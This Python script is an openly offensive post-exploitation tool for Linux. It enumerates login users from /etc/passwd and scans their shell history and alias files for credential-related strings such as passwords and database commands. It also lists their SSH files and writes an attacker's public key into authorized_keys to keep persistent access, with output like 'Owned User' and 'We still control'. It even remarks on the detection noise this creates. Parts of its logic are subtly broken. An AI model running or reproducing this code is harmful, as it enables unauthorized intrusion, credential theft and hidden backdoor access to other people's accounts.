#!/usr/bin/env python3
from random import randint
from sys import platform
from os.path import isfile, isdir
from os import access, W_OK, R_OK, walk, getlogin, environ, path


valid_homes = [ 'var', 'home', 'export', 'usr', 'opt', 'ext', 'etc', 'srv', 'dev', 'mnt', 'lib', 'root' ]
validUsers = []
user_files = [ '/etc/passwd' ]
good_shells = [ 'bash', 'zsh', 'ksh', 'csh', 'eksh', 'sh' ]
our_key = '' # add your key here. the public key, not the private key.
if str(environ.get('USER')) != '':
    current = str(environ.get('USER'))
elif str(environ.get('USERNAME')) != '':
    current = str(environ.get('USERNAME'))
else:
    current = getlogin()


def checkhistfile(user_home_directory:str):
    identified_history_strings = [  ]
    return_values = []
    nice_strings = ("py", "sh", "conf", "ssh", "gcc", "ssh-keygen", "ssh-agent", "ini", "php", "systemctl", "rb", "db", "sqlite", "sql", "base64", "mysql", "postgres", "user", "password", 'passwd', 'echo', 'perl', 'ruby', 'cargo', 'pip', 'gem', 'bundle', 'rake', 'g++', 'make', 'cmake', 'qmake', 'autoconf')
    if user_home_directory:
        for root,dirs,filenames in walk(user_home_directory):
            for file in filenames:
                if "history" in str(file) or "alias" in str(file) and str(file).endswith(('.png', '.jpg', '.jpeg', '.tiff', '.bmp', '.gif', '.mov', '.webm', '.js')) == False and access(path.join(root, file), R_OK) is True:
                    try:
                        with open(path.join(root, file), "r") as in_history:
                            for line in in_history.readlines():
                                line = line.strip("\n")
                                for i in nice_strings:
                                    if i in str(line):
                                        for i in range(2, 100):
                                            str(line).replace(' ' * i, ' ')
                                        identified_history_strings.append(str(line).replace('\'', '"').replace(":", " ").replace(";", " ").replace('\t', ' '))
                        fname = path.join(root, file)
                        return_values.append(f"File:{fname} split Hits:{identified_history_strings}")
                        identified_history_strings.clear()
                    except (PermissionError, UnicodeDecodeError) as e:
                        print(f"\033[0;31mError: {str(e)} File: {path.join(root, file)}\033[0m")
                        fname = path.join(root, file)
                        return_values.append(f"File:{fname} split Hits: {str(e)}")
                        pass
        return return_values

def maintain_persistence(ssh_auth_keys_file:str, current_key:str):
    if ssh_auth_keys_file is not None:
        try:
            with open(ssh_auth_keys_file, "r") as in_auth_keys:
                for line in in_auth_keys.readlines():
                    line = line.strip("\n")
                    if current_key == line:
                        return True
            return False
        except FileNotFoundError:
            return False

def read_auth_keys(ssh_dir:str, inject_keys:bool, our_key_inject:str):
    identified_files = []
    still_persist = []
    if isdir(f"{ssh_dir}") is True:
        if access(f"{ssh_dir}", R_OK) is True or access(f"{ssh_dir}", W_OK) is True:
            if inject_keys is not False:
                if maintain_persistence(f"{ssh_dir}/authorized_keys", our_key_inject) is False:
                    if our_key_inject is not None and access(f"{ssh_dir}/authorized_keys", W_OK) is True:
                        with open(f"{ssh_dir}/authorized_keys", "r") as in_keys:
                            for line in in_keys.readlines():
                                line = line.strip('\n')
                                print(f"Keys: {line}")
                    elif access(f"{ssh_dir}", W_OK) and inject_keys is True and isfile(f"{ssh_dir}/authorized_keys") is False:
                        if input(f"Shall we create the file?(This will create alot of noise if the user does not have this file already and there are file system events being tracked.)Y/N\nThis will be created in {ssh_dir}->").lower() == "y":
                                with open(f"{ssh_dir}/authorized_keys", "w") as create_auth_keys_file:
                                    identified_files.append(f"Created: {ssh_dir}/authorized_keys")
                                    create_auth_keys_file.writelines(our_key_inject)
                        else:
                            inject_keys = False
                            our_key_inject = None
                else:
                    still_persist.append(f"We still control: {ssh_dir}/authorized_keys - Key: {our_key_inject}")
            for root,dirs,filename in walk(ssh_dir):
                for name in filename:
                    identified_files.append(str(path.join(root, name)))
            return {"Success": True, "File Read": f"{ssh_dir}/authorized_keys", "Injected Keys": inject_keys, "Key Injected": f"{our_key_inject}", "Identified Files": identified_files, "Still Persist": still_persist}
        else:
            return {"Success": False, "File Read": None, "Read": None, "Write": None, "Injected Keys": None, "Key Injected": None, "Identified Files": None}    
    else:
        return {"Success": False, "File Read": None, "Read": None, "Write": None, "Injected Keys": None, "Key Injected": None, "Identified Files": None}


def verify_users(user:str, passwdFile:str, inject_keys:bool):
    user_found = 0
    total_users = 0
    system_user = 0
    currentPlatform = str(platform)
    if isinstance(user, list) and isfile(passwdFile):
        if "linux" in currentPlatform.lower():
            print(f"Verifying on linux, using {passwdFile}")
            with open(passwdFile, "r") as inPasswdFile:
                for line in inPasswdFile.readlines():
                    line = str(line).strip('\n')
                    line = line.split(":")
                    shell = line[6]
                    user_name = line[0]
                    user_home = line[5]
                    t_home = str(user_home).split('/')
                    sh = shell.split('/')
                    if user_name:
                            total_users += 1
                    if user_name not in user:
                        if t_home[1] in valid_homes and sh[-1] in good_shells:
                            k = read_auth_keys(f"{user_home}/.ssh", inject_keys, our_key)
                            d = checkhistfile(user_home)
                            write_access = access(f"{user_home}", W_OK)
                            read_access = access(f"{user_home}", R_OK)
                            user_found += 1
                            validUsers.append(f"{user_name}:{user_home}:{shell}:Owned User: {user_name} - Key Injected({k['Injected Keys']}): {k['Key Injected']} - File: {k['File Read']}")
                            if k['Success'] is False:
                                print(f"\033[0;32mUser: {user_name} \033[0m\033[0;34m|\033[0m \033[0;32mShell: {shell} \033[0m\033[0;34m|\033[0m\033[0;32m Home: {user_home} \033[0m\033[0;34m|\033[0m"\
                                    f"\033[0;32m Can we Write to {user_home}: {write_access} \033[0m\033[0;34m|\033[0m\033[0;32m Can we read {user_home}: {read_access} \033[0m\033[0;34m|\033[0m")
                            else:
                                print(f"\033[0;32mUser: {user_name} \033[0m\033[0;34m|\033[0m \033[0;32mShell: {shell} \033[0m\033[0;34m|\033[0m\033[0;32m Home: {user_home} \033[0m\033[0;34m|\033[0m"\
                                    f"\033[0;32m Can we Write to {user_home}: {write_access} \033[0m\033[0;34m|\033[0m\033[0;32m Can we read {user_home}: {read_access} \033[0m\033[0;34m|\033[0m "\
                                    f"\033[0;32mSSH Directory found: {k['File Read']}\033[0m\033[0;34m|\033[0m\033[0;32m Found Files: {k['Identified Files']} \033[0;34m|\033[0m\033[0;32m {k['Still Persist']}"\
                                    )
                                if d:
                                    for i in d:
                                        i = str(i).split("split")
                                        print(f"\033[0;34m|\033[0m \033[4;36m{i[0].strip(' ')}:\033[0m \033[0;33m{i[1:]}\033[0m \033[0m\033[0;34m|\033[0m")
                        else:
                            system_user += 1
            print(f"\033[0;32mIdentified Users: {user_found}\033[0m\n\033[0;31mSystem Users Identified: {system_user}\033[0m\n\033[0;33mTotal Users Found: {total_users}\033[0m")
            return {"Success":True, "Users":validUsers}
        else:
                print("Sorry, no methods for anything other than Linux yet.")
                return {"Success":False,"Users":None}
    else:
            print(f"Cannot work with what was supplied.\nuser needs to be type list, but {type(user)} supplied.\nOr valid file to parse over for passwd needed, but: {passwdFile}: isfile:{isfile(passwdFile)}")
            return {"Success":False,"Users":None}


results = []
for i in user_files:
    aa = verify_users([], i, True)
    if aa['Success'] is True:
        results.append(aa)
print(f"\033[0;34mWho you be: {current}\033[0m")
for res in results:
    print(f"{res}")

